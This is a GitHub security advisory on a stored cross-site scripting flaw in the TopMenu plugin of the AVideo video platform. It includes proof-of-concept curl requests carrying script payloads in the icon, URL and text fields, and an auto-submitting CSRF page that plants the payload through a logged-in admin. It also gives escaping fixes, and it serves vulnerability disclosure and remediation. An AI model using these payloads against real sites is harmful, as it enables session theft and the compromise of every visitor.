# [M] AVideo has Stored XSS via Unescaped Menu Item Fields in TopMenu Plugin

## Summary
Severity: Medium
Advisory: GHSA-gmpc-fxg2-vcmq
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-gmpc-fxg2-vcmq
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The TopMenu plugin renders menu item fields (icon classes, URLs, and text labels) directly into HTML without applying `htmlspecialchars()` or any other output encoding. Since menu items are rendered on every public page through plugin hooks, a single malicious menu entry results in stored cross-site scripting that executes for every visitor to the site. An admin user who is tricked into saving a crafted menu item (or an attacker who gains admin access) can compromise all site visitors.

## Details

Multiple output locations in the TopMenu plugin render user-controlled data without escaping:

In `HTMLMenuRight.php:24`, the icon class is injected directly:

```php
<i class="<?php echo $value2['icon'] ?>"></i>
```

In `HTMLMenuRight.php:40`, the URL is rendered without encoding:

```php
<a href="<?php echo $value2['finalURL']; ?>">
```

In `HTMLMenuLeft.php:32`, same pattern for the left menu:

```php
<a href="<?php echo $value2['finalURL']; ?>">
```

In `index.php:49`, the menu item text is echoed raw:

```php
<?php echo $menuItem->getText(); ?>
```

Menu item data is saved via `menuItemSave.json.php` with no sanitization in the setter methods. The stored values are loaded from the database and rendered on every page because the TopMenu plugin hooks into the global page layout.

Critically, `menuItemSave.json.php` has no CSRF protection. It checks `User::isAdmin()` but does not call `isGlobalTokenValid()` or perform any other CSRF token validation. This means the stored XSS can be chained with CSRF: an attacker does not need a compromised admin account. Instead, a cross-origin POST from an attacker-controlled page can create the malicious menu item if an admin visits the attacker's page while logged in.

## Proof of Concept

1. As an admin user, save a menu item with a malicious icon class:

```bash
curl -b "PHPSESSID=ADMIN_SESSION" \
  -X POST "https://your-avideo-instance.com/plugin/TopMenu/menuItemSave.json.php" \
  -d 'icon=fa-home" onmouseover="alert(document.cookie)&text=Home&url=/&status=a'
```

2. Alternatively, inject via the URL field to create a JavaScript link:

```bash
curl -b "PHPSESSID=ADMIN_SESSION" \
  -X POST "https://your-avideo-instance.com/plugin/TopMenu/menuItemSave.json.php" \
  -d 'icon=fa-link&text=Click+Me&url=javascript:alert(document.cookie)&status=a'
```

3. Alternatively, inject via the text field:

```bash
curl -b "PHPSESSID=ADMIN_SESSION" \
  -X POST "https://your-avideo-instance.com/plugin/TopMenu/menuItemSave.json.php" \
  -d 'icon=fa-home&text=<script>alert(document.cookie)</script>&url=/&status=a'
```

4. Alternatively, chain with CSRF (no admin account needed). Host this HTML on an attacker-controlled domain and lure an admin to visit it:

```html
<!DOCTYPE html>
<html>
<head><title>AVI-041 CSRF + Stored XSS PoC</title></head>
<body>
<h1>Loading...</h1>
<iframe name="f1" style="display:none"></iframe>
<form id="inject" method="POST" target="f1"
      action="https://your-avideo-instance.com/plugin/TopMenu/menuItemSave.json.php">
  <input type="hidden" name="menuId" value="1" />
  <input type="hidden" name="item_order" value="99" />
  <input type="hidden" name="item_status" value="a" />
  <input type="hidden" name="text" value="&lt;script&gt;alert(document.cookie)&lt;/script&gt;" />
  <input type="hidden" name="title" value="Home" />
  <input type="hidden" name="url" value="/" />
  <input type="hidden" name="icon" value="fa-home" />
  <input type="hidden" name="menuSeoUrlItem" value="" />
</form>
<script>document.getElementById('inject').submit();</script>
</body>
</html>
```

The cross-origin POST creates the malicious menu item because `menuItemSave.json.php` has no CSRF token validation.

5. Visit any page on the AVideo instance:

```bash
curl "https://your-avideo-instance.com/"
```

6. The injected JavaScript executes in the context of every visitor's browser session because the menu is rendered on all pages.

## Impact

Stored cross-site scripting on every page of the AVideo instance. An attacker can steal session cookies, redirect users to phishing pages, modify page content, or perform actions on behalf of authenticated users (including admins). Because the menu renders globally, a single injection point compromises all visitors to the site.

## Recommended Fix

Apply `htmlspecialchars()` with `ENT_QUOTES` to all outputs of `$value2['finalURL']`, `$value2['icon']`, and `$menuItem->getText()` in the TopMenu plugin templates:

```php
// HTMLMenuRight.php:24
<i class="<?php echo htmlspecialchars($value2['icon'], ENT_QUOTES, 'UTF-8'); ?>"></i>

// HTMLMenuRight.php:40
<a href="<?php echo htmlspecialchars($value2['finalURL'], ENT_QUOTES, 'UTF-8'); ?>">

// HTMLMenuLeft.php:32
<a href="<?php echo htmlspecialchars($value2['finalURL'], ENT_QUOTES, 'UTF-8'); ?>">

// floatMenu.php - same pattern for any $value2['icon'] and $value2['finalURL'] outputs
// index.php:49
<?php echo htmlspecialchars($menuItem->getText(), ENT_QUOTES, 'UTF-8'); ?>
```

Apply the same encoding to every location in `HTMLMenuRight.php`, `HTMLMenuLeft.php`, `floatMenu.php`, and `index.php` where these values are echoed into HTML.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-gmpc-fxg2-vcmq
- https://github.com/WWBN/AVideo
